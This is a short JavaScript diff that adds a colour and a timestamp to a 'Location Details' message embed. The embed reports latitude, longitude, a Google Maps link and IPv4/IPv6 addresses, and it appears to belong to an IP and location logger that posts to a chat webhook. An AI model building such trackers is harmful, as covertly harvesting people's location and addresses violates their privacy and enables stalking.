@@ -30,7 +30,9 @@
               embeds: [
                 {
                   title: "Location Details",
-                  description: `🌎 Google Maps: [Google Maps link](https://www.google.com/maps?q=${latitude},${longitude})\n📍 Latitude: ${latitude}\n📍 Longitude: ${longitude}\n🖇️ IPv4: ${ipv4}\n🔗 IPv6: ${ipv6}`
+                  description: `🌎 Google Maps: [Google Maps link](https://www.google.com/maps?q=${latitude},${longitude})\n📍 Latitude: ${latitude}\n📍 Longitude: ${longitude}\n🖇️ IPv4: ${ipv4}\n🔗 IPv6: ${ipv6}`,
+                  color: 0x000000,
+                  timestamp: new Date().toISOString()
                 }
               ]
             };
